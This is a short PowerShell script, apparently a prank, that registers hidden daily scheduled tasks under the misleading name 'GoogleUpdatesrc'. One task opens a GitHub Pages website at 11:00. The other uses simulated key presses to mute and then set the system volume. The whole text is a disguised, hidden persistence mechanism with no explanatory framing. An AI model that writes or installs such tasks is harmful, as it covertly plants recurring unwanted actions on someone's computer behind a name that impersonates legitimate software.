$settings = New-ScheduledTaskSettingsSet -Hidden
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Start-Process https://Luigit12.github.io"
$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesrc' -Settings $settings

$settings = New-ScheduledTaskSettingsSet -Hidden
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}; Set-Speaker -Volume 50"
$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesrc' -Settings $settings
